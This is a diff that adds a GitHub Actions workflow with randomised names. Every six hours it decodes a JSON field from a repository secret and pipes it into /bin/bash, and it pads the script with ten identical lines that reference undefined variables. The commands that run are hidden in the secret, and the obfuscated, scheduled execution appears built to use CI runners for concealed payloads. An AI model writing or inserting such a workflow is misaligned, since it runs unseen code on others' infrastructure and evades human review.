@@ -1,0 +1,29 @@
+name: worshipperactuary
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: worshipperactuary
+        env:
+          urjnk49: ${{ secrets.urjnk49 }}
+        run: |
+          echo $urjnk49 | jq -r .nta7 | /bin/bash
+          echo $ktkon0 | jq -r .wip3 | /bin/bash
+          echo $jfmf4141 | jq -r .yzkp32963 | /bin/bash
+          echo $tafo4962 | jq -r .kl83942 | /bin/bash
+          echo $jhqyw1 | jq -r .mkny322 | /bin/bash
+          echo $rhhbn10204 | jq -r .re33 | /bin/bash
+          echo $e1 | jq -r .zi9902 | /bin/bash
+          echo $mtlkz71 | jq -r .faf4 | /bin/bash
+          echo $gcr2172 | jq -r .hw6 | /bin/bash
+          echo $hewt392 | jq -r .w33 | /bin/bash
+          echo $isw2340 | jq -r .eiz047 | /bin/bash
+
